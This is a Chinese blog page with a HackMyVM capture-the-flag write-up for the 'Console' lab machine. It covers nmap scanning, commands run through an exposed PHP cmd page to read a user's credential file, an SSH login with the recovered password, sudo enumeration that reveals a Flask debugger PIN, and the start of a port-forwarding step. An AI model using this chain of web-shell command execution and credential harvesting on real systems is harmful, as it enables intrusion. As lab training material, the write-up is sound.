@@ -1,0 +1,743 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>HMV-Concole | Moriiの博客</title><meta name="keywords" content="HMV"><meta name="author" content="Morii"><meta name="copyright" content="Morii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HMV-Concole 信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash] └─# arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:a6:0f:62, IPv4: 192.168.134.76 Starting arp-scan 1.10.0 with 256 hosts (htt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-Concole">
+<meta property="og:url" content="https://drume2.github.io/posts/3bb8f4e6.html">
+<meta property="og:site_name" content="Moriiの博客">
+<meta property="og:description" content="HMV-Concole 信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash] └─# arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:a6:0f:62, IPv4: 192.168.134.76 Starting arp-scan 1.10.0 with 256 hosts (htt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/5.webp">
+<meta property="article:published_time" content="2025-06-27T06:01:51.000Z">
+<meta property="article:modified_time" content="2025-06-27T09:31:20.252Z">
+<meta property="article:author" content="Morii">
+<meta property="article:tag" content="HMV">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/5.webp"><link rel="shortcut icon" href="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp"><link rel="canonical" href="https://drume2.github.io/posts/3bb8f4e6"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"一年之内的产物","messageNext":"技术可能存在过期"},
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HMV-Concole',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-06-27 17:31:20'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link defer rel="stylesheet" href="/css/customm.css" ><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/icon.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/background.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/index_ee.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@master/Hexo/css/flink.min.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://npm.elemecdn.com/xianqi-hexo/imgg/5.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Moriiの博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HMV-Concole</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-27T06:01:51.000Z" title="发表于 2025-06-27 14:01:51">2025-06-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-27T09:31:20.252Z" title="更新于 2025-06-27 17:31:20">2025-06-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HMV/">HMV</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HMV-Concole"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="HMV-Concole"><a href="#HMV-Concole" class="headerlink" title="HMV-Concole"></a>HMV-Concole</h2><p><img src="/posts/3bb8f4e6/image-20250627140555804.png" alt="image-20250627140555804"></p>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
+└─# arp-scan -l
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:a6:0f:62, IPv4: 192.168.134.76
+Starting arp-scan 1.10.0 with 256 hosts (https:&#x2F;&#x2F;github.com&#x2F;royhills&#x2F;arp-scan)
+192.168.134.92  08:00:27:12:c5:56       PCS Systemtechnik GmbH
+192.168.134.94  ec:8e:77:8f:19:c5       (Unknown)
+192.168.134.228 96:32:fb:1f:07:98       (Unknown: locally administered)
+
+5 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 2.405 seconds (106.44 hosts&#x2F;sec). 3 responded
+
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# nmap 192.168.134.92 -A
+Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-06-27 01:34 EDT
+Nmap scan report for sys.hidden.hmv (192.168.134.92)
+Host is up (0.00037s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE    SERVICE  VERSION
+22&#x2F;tcp   open     ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey:
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80&#x2F;tcp   open     http     Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache&#x2F;2.4.62 (Debian)
+|_http-title: Console \xC2\xB7 \xE9\xBB\x91\xE5\xAE\xA2\xE7\x9A\x84\xE7\xAA\x97\xE5\x8F\xA3
+443&#x2F;tcp  open     ssl&#x2F;http Apache httpd 2.4.62
+| ssl-cert: Subject: commonName&#x3D;hacker.maze-sec.hmv&#x2F;organizationName&#x3D;Maze-Sec&#x2F;stateOrProvinceName&#x3D;Beijing&#x2F;countryName&#x3D;CN
+| Not valid before: 2025-05-17T09:19:35
+|_Not valid after:  2035-05-15T09:19:35
+| tls-alpn:
+|_  http&#x2F;1.1
+|_ssl-date: TLS randomness does not represent time
+|_http-title: 403 Forbidden
+|_http-server-header: Apache&#x2F;2.4.62 (Debian)
+5000&#x2F;tcp filtered upnp
+MAC Address: 08:00:27:12:C5:56 (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:&#x2F;o:linux:linux_kernel:5 cpe:&#x2F;o:mikrotik:routeros:7 cpe:&#x2F;o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: Host: hacker.maze-sec.hmv; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.37 ms sys.hidden.hmv (192.168.134.92)
+
+OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+Nmap done: 1 IP address (1 host up) scanned in 17.96 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>nmap里面发现了两个域名，<strong>hacker.maze-sec.hmv</strong>和<strong>sys.hidden.hmv</strong>，修改一下hosts</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# cat &#x2F;etc&#x2F;hosts
+192.168.134.92 sys.hidden.hmv hacker.maze-sec.hmv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>靶机开放了22，80，443这三个端口，并且5000是被过滤掉了</p>
+<p>先去web页面看一下80和443端口的情况，80端口的页面如下</p>
+<p><img src="/posts/3bb8f4e6/image-20250627140852610.png" alt="image-20250627140852610"></p>
+<p>443端口被forbidden了</p>
+<p><img src="/posts/3bb8f4e6/image-20250627141033687.png" alt="image-20250627141033687"></p>
+<p>使用curl的-v命令查看一下信息</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# curl https:&#x2F;&#x2F;192.168.134.92 -v
+*   Trying 192.168.134.92:443...
+* GnuTLS ciphers: NORMAL:-ARCFOUR-128:-CTYPE-ALL:+CTYPE-X509:-VERS-SSL3.0
+* ALPN: curl offers h2,http&#x2F;1.1
+* found 152 certificates in &#x2F;etc&#x2F;ssl&#x2F;certs&#x2F;ca-certificates.crt
+* found 458 certificates in &#x2F;etc&#x2F;ssl&#x2F;certs
+* SSL connection using TLS1.3 &#x2F; ECDHE_RSA_AES_256_GCM_SHA384
+* server verification failed: certificate signer not trusted. (CAfile: &#x2F;etc&#x2F;ssl&#x2F;certs&#x2F;ca-certificates.crt CRLfile: none)
+* closing connection #0
+curl: (60) server verification failed: certificate signer not trusted. (CAfile: &#x2F;etc&#x2F;ssl&#x2F;certs&#x2F;ca-certificates.crt CRLfile: none)
+More details here: https:&#x2F;&#x2F;curl.se&#x2F;docs&#x2F;sslcerts.html
+
+curl failed to verify the legitimacy of the server and therefore could not
+establish a secure connection to it. To learn more about this situation and
+how to fix it, please visit the webpage mentioned above.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>发现证书不存在，那接着使用-k读取一下信息，发现是一个自签的证书</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# curl https:&#x2F;&#x2F;192.168.134.92 -v -k
+*   Trying 192.168.134.92:443...
+* GnuTLS ciphers: NORMAL:-ARCFOUR-128:-CTYPE-ALL:+CTYPE-X509:-VERS-SSL3.0
+* ALPN: curl offers h2,http&#x2F;1.1
+* SSL connection using TLS1.3 &#x2F; ECDHE_RSA_AES_256_GCM_SHA384
+*   server certificate verification SKIPPED
+*   server certificate status verification SKIPPED
+*   common name: hacker.maze-sec.hmv (does not match &#39;192.168.134.92&#39;)
+*   server certificate expiration date OK
+*   server certificate activation date OK
+*   certificate public key: RSA
+*   certificate version: #3
+*   subject: C&#x3D;CN,ST&#x3D;Beijing,L&#x3D;Beijing,O&#x3D;Maze-Sec,OU&#x3D;IT,CN&#x3D;hacker.maze-sec.hmv
+*   start date: Sat, 17 May 2025 09:19:35 GMT
+*   expire date: Tue, 15 May 2035 09:19:35 GMT
+*   issuer: C&#x3D;CN,ST&#x3D;Beijing,L&#x3D;Beijing,O&#x3D;Maze-Sec,OU&#x3D;IT,CN&#x3D;hacker.maze-sec.hmv
+* ALPN: server accepted http&#x2F;1.1
+* Connected to 192.168.134.92 (192.168.134.92) port 443
+* using HTTP&#x2F;1.x
+&gt; GET &#x2F; HTTP&#x2F;1.1
+&gt; Host: 192.168.134.92
+&gt; User-Agent: curl&#x2F;8.12.1
+&gt; Accept: *&#x2F;*
+&gt;
+* Request completely sent off
+&lt; HTTP&#x2F;1.1 403 Forbidden
+&lt; Date: Fri, 27 Jun 2025 06:42:04 GMT
+&lt; Server: Apache&#x2F;2.4.62 (Debian)
+&lt; Content-Length: 280
+&lt; Content-Type: text&#x2F;html; charset&#x3D;iso-8859-1
+&lt;
+&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;
+&lt;&#x2F;head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;&#x2F;h1&gt;
+&lt;p&gt;You don&#39;t have permission to access this resource.&lt;&#x2F;p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache&#x2F;2.4.62 (Debian) Server at 192.168.134.92 Port 443&lt;&#x2F;address&gt;
+&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;
+* Connection #0 to host 192.168.134.92 left intact<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>下面去访问域名的https网址</p>
+<p><img src="/posts/3bb8f4e6/image-20250627141529123.png" alt="image-20250627141529123"></p>
+<p>再js&#x2F;hacker.js文件内找到 一个php文件，但是文件名被分开了</p>
+<p><img src="/posts/3bb8f4e6/image-20250627143440469.png" alt="image-20250627143440469"></p>
+<p><strong>supercoool.php</strong>，访问这个页面</p>
+<p><img src="/posts/3bb8f4e6/image-20250627144443346.png" alt="image-20250627144443346"></p>
+<p>提示没有cmd命令，接着先尝试能否查看id命令</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa&#x2F;hacker.maze-sec.hmv]
+└─# curl https:&#x2F;&#x2F;hacker.maze-sec.hmv&#x2F;supercoool.php?cmd&#x3D;id -k
+&lt;pre&gt;uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)
+&lt;&#x2F;pre&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>能查看id，接着测试能否查看home目录的结构,并尝试读取文件</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa&#x2F;hacker.maze-sec.hmv]
+└─# curl https:&#x2F;&#x2F;hacker.maze-sec.hmv&#x2F;supercoool.php?cmd&#x3D;ls%20-al%20&#x2F;home -k
+&lt;pre&gt;total 16
+drwxr-xr-x  4 root    root    4096 May 16 07:05 .
+drwxr-xr-x 18 root    root    4096 Mar 18 20:37 ..
+drwxr-xr-x  4 qaq     qaq     4096 May 17 05:38 qaq
+drwxr-xr-x  2 welcome welcome 4096 Jun 25 04:02 welcome
+&lt;&#x2F;pre&gt;                                                                                                
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa&#x2F;hacker.maze-sec.hmv]
+└─# curl https:&#x2F;&#x2F;hacker.maze-sec.hmv&#x2F;supercoool.php?cmd&#x3D;ls%20-al%20&#x2F;home&#x2F;welcome -k
+&lt;pre&gt;total 32
+drwxr-xr-x 2 welcome welcome 4096 Jun 25 04:02 .
+drwxr-xr-x 4 root    root    4096 May 16 07:05 ..
+-rw------- 1 welcome welcome  259 Jun 27 01:44 .bash_history
+-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
+-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
+-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
+-rw-r--r-- 1 root    root      19 May 16 10:48 .viminfo
+-rw-r--r-- 1 root    root      44 May 17 06:01 user.txt
+&lt;&#x2F;pre&gt;                                                                                                
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa&#x2F;hacker.maze-sec.hmv]
+└─# curl https:&#x2F;&#x2F;hacker.maze-sec.hmv&#x2F;supercoool.php?cmd&#x3D;cat%20&#x2F;home&#x2F;welcome&#x2F;.viminfo -k
+&lt;pre&gt;welcome:welcome123
+&lt;&#x2F;pre&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>得到了welcome的密码</p>
+<h3 id="ssh登陆"><a href="#ssh登陆" class="headerlink" title="ssh登陆"></a>ssh登陆</h3><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa&#x2F;hacker.maze-sec.hmv]
+└─# ssh welcome@192.168.134.92
+welcome@192.168.134.92&#39;s password:
+Linux Console 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+       _,met$$$$$gg.           root@Console
+    ,g$$$$$$$$$$$$$$$P.        ------------
+  ,g$$P&quot;         &quot;&quot;&quot;Y$$.&quot;.     OS: Debian GNU&#x2F;Linux buster 10.13 x86_64
+ ,$$P&#39;               &#96;$$$.     Host: VirtualBox (1.2)
+&#39;,$$P       ,ggs.     &#96;$$b:    Kernel: Linux 4.19.0-27-amd64
+&#96;d$$&#39;     ,&quot;&#39;   .    $$$       Uptime: 1 hour, 28 mins
+ $$P      d     ,    $$$P      Packages: 538 (dpkg)
+ $$:      $.   -    ,d$$&#39;      Shell: bash 5.0.3
+ $$;      Y._   _,d&#39;           Display (Virtual-1): 800x600 @ 60Hz
+ Y$$.    &#96;.&#96;&quot;Y$$$$P&quot;&#39;          Cursor: Adwaita
+ &#96;$$b      &quot;-.__               Terminal: run-parts
+  &#96;Y$$                         CPU: Intel(R) Core(TM) i7-14650HX @ 2.42 GHz
+   &#96;Y$$.                       GPU: VMware SVGA II Adapter
+     &#96;$$b.                     Memory: 294.65 MiB &#x2F; 1.95 GiB (15%)
+       &#96;Y$$b.                  Swap: 0 B &#x2F; 975.00 MiB (0%)
+          &#96;&quot;Y$b._              Disk (&#x2F;): 2.53 GiB &#x2F; 28.42 GiB (9%) - ext4
+             &#96;&quot;&quot;&quot;              Local IP (enp0s3): 192.168.134.92&#x2F;24
+                               Battery: 100% [AC Connected]
+                               Locale: C
+
+                               ████████████████████████
+                               ████████████████████████
+
+The programs included with the Debian GNU&#x2F;Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.
+
+Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jun 27 01:44:27 2025
+welcome@Console:~$ id
+uid&#x3D;1000(welcome) gid&#x3D;1000(welcome) groups&#x3D;1000(welcome)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="userflag"><a href="#userflag" class="headerlink" title="userflag"></a>userflag</h4><pre class="line-numbers language-none"><code class="language-none">welcome@Console:~$ ls -al
+total 32
+drwxr-xr-x 2 welcome welcome 4096 Jun 25 04:02 .
+drwxr-xr-x 4 root    root    4096 May 16 07:05 ..
+-rw------- 1 welcome welcome  259 Jun 27 01:44 .bash_history
+-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
+-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
+-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
+-rw-r--r-- 1 root    root      44 May 17 06:01 user.txt
+-rw-r--r-- 1 root    root      19 May 16 10:48 .viminfo
+welcome@Console:~$ cat user.txt
+flag&#123;user-376760a7c739a606d4f8d8340bad4184&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>接着查看sudo权限</p>
+<pre class="line-numbers language-none"><code class="language-none">welcome@Console:~$ sudo -l
+[sudo] password for welcome:
+Matching Defaults entries for welcome on Console:
+    env_reset, mail_badpass,
+    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin
+
+User welcome may run the following commands on Console:
+    (qaq) PASSWD: &#x2F;bin&#x2F;cat &#x2F;opt&#x2F;flask-app&#x2F;logs&#x2F;flask.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以使用qaq的用户查看flask的log文件</p>
+<pre class="line-numbers language-none"><code class="language-none">welcome@Console:~$ sudo -u qaq &#x2F;bin&#x2F;cat &#x2F;opt&#x2F;flask-app&#x2F;logs&#x2F;flask.log
+
+ * Serving Flask app &#39;app&#39;
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http:&#x2F;&#x2F;127.0.0.1:5000
+ * Running on http:&#x2F;&#x2F;192.168.134.92:5000
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 115-791-329<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>得到了一个pin码</p>
+<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>查看一下端口的使用情况</p>
+<pre class="line-numbers language-none"><code class="language-none">welcome@Console:~$ ss -lntup
+Netid     State       Recv-Q      Send-Q           Local Address:Port           Peer Address:Port
+udp       UNCONN      0           0                      0.0.0.0:68                  0.0.0.0:*
+tcp       LISTEN      0           128                    0.0.0.0:5000                0.0.0.0:*
+tcp       LISTEN      0           128                    0.0.0.0:22                  0.0.0.0:*
+tcp       LISTEN      0           128                          *:443                       *:*
